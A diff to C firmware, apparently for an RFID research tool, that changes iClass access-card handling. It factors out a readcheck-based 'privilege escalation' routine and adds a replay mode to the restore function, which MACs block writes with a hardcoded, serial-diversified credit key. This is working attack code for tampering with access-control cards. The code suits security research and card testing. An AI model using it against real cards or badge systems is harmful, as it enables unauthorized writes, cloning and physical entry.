@@ -2552,7 +2552,38 @@ out:
     }
 }
 
+static bool do_privilege_escalation(uint8_t *read_check_cc, size_t cc_len, uint32_t *eof_time){
+    uint16_t resp_len = 0;
+    int res2;
+    uint8_t resp[10] = {0};
+    int priv_esc_tries = 0;
+    bool priv_esc = false;
+    uint32_t start_time = 0;
+    while (!priv_esc) {
+        //The privilege escalation is done with a readcheck and not just a normal read!
+        start_time = *eof_time + DELAY_ICLASS_VICC_TO_VCD_READER;
+        iclass_send_as_reader(read_check_cc, cc_len, &start_time, eof_time, false);
+        // expect a 8-byte response here
+        res2 = GetIso15693AnswerFromTag(resp, sizeof(resp), ICLASS_READER_TIMEOUT_OTHERS, eof_time, false, true, &resp_len);
+        if (res2 != PM3_SUCCESS || resp_len != 8) {
+            priv_esc_tries++;
+        } else {
+            return true;
+        }
+        if (priv_esc_tries == 5) {
+            DbpString("");
+            DbpString(_RED_("Unable to complete privilege escalation! Stopping."));
+            return false;
+        }
+    }
+    return false;
+}
+
 void iClass_Restore(iclass_restore_req_t *msg) {
+    bool priv_esc = false;
+    uint8_t read_check_cc[] = { 0x10 | ICLASS_CMD_READCHECK, 0x18 };
+    uint8_t credit_key[8] = {0xFD, 0xCB, 0x5A, 0x52, 0xEA, 0x8F, 0x30, 0x90};
+    uint8_t div_cc[8] = {0};
 
     // sanitation
     if (msg == NULL) {
@@ -2581,7 +2612,9 @@ void iClass_Restore(iclass_restore_req_t *msg) {
     if (res == false) {
         goto out;
     }
+    iclass_calc_div_key((uint8_t *)&hdr.csn, credit_key, div_cc, false);
 
+    read_check_cc[1] = ((uint8_t *)&hdr.conf)[0] + 1; //first block of AA2
     // authenticate
     uint8_t mac[4] = {0};
     uint32_t start_time = eof_time + DELAY_ICLASS_VICC_TO_VCD_READER;
@@ -2590,6 +2623,13 @@ void iClass_Restore(iclass_restore_req_t *msg) {
     if (msg->req.do_auth) {
         res = authenticate_iclass_tag(&msg->req, &hdr, &start_time, &eof_time, mac);
         if (res == false) {
+            goto out;
+        }
+    }
+
+    if(msg->req.use_replay){
+        priv_esc = do_privilege_escalation(read_check_cc, sizeof(read_check_cc), &eof_time);
+        if (!priv_esc){
             goto out;
         }
     }
@@ -2611,10 +2651,13 @@ void iClass_Restore(iclass_restore_req_t *msg) {
             wb[0] = item.blockno;
             memcpy(wb + 1, item.data, 8);
 
-            if (msg->req.use_credit_key)
+            if (msg->req.use_credit_key){
                 doMAC_N(wb, sizeof(wb), hdr.key_c, mac);
-            else
+            }else if (msg->req.use_replay){
+                doMAC_N(wb, sizeof(wb), div_cc, mac);
+            }else{
                 doMAC_N(wb, sizeof(wb), hdr.key_d, mac);
+            }
         }
 
         // data + mac
@@ -2767,11 +2810,8 @@ void iClass_Recover(iclass_recover_req_t *msg) {
     while (bits_found == -1) {
 
         reinit_tentatives = 0;
-        int res2;
-        uint8_t resp[10] = {0};
         uint8_t mac2[4] = {0};
         res = false;
-        uint16_t resp_len = 0;
 
         if (BUTTON_PRESS() || loops > msg->loop) {
             if (loops > msg->loop) {
@@ -2827,25 +2867,15 @@ void iClass_Recover(iclass_recover_req_t *msg) {
         }
 
         //Step2 Privilege Escalation: attempt to read AA2 with credentials for AA1
-        int priv_esc_tries = 0;
-        while (!priv_esc) {
-            //The privilege escalation is done with a readcheck and not just a normal read!
-            start_time = eof_time + DELAY_ICLASS_VICC_TO_VCD_READER;
-            iclass_send_as_reader(read_check_cc, sizeof(read_check_cc), &start_time, &eof_time, shallow_mod);
-            // expect a 8-byte response here
-            res2 = GetIso15693AnswerFromTag(resp, sizeof(resp), ICLASS_READER_TIMEOUT_OTHERS, &eof_time, false, true, &resp_len);
-            if (res2 != PM3_SUCCESS || resp_len != 8) {
-                priv_esc_tries++;
-            } else {
-                status_message = 3; //privilege escalation successful
-                priv_esc = true;
-            }
-            if (priv_esc_tries == 5) {
-                DbpString("");
-                DbpString(_RED_("Unable to complete privilege escalation! Stopping."));
+        if(!priv_esc){
+            priv_esc = do_privilege_escalation(read_check_cc, sizeof(read_check_cc), &eof_time);
+            if (priv_esc){
+                status_message = 3;
+            }else{
                 goto out;
             }
         }
+
         if (priv_esc && status_message != 3) {
             start_time = eof_time + DELAY_ICLASS_VICC_TO_VCD_READER;
             iclass_send_as_reader(read_check_cc, sizeof(read_check_cc), &start_time, &eof_time, shallow_mod);
@@ -2882,6 +2912,7 @@ void iClass_Recover(iclass_recover_req_t *msg) {
         bool write_error = false;
         while (written == false && write_error == false) {
             //Step5 Perform Write
+            start_time = eof_time + DELAY_ICLASS_VICC_TO_VCD_READER;
             if (iclass_writeblock_sp(blockno, genkeyblock, mac2, shallow_mod, &start_time, &eof_time, short_delay)) {
                 status_message = 4; //wrote new key on the card - unverified
             }
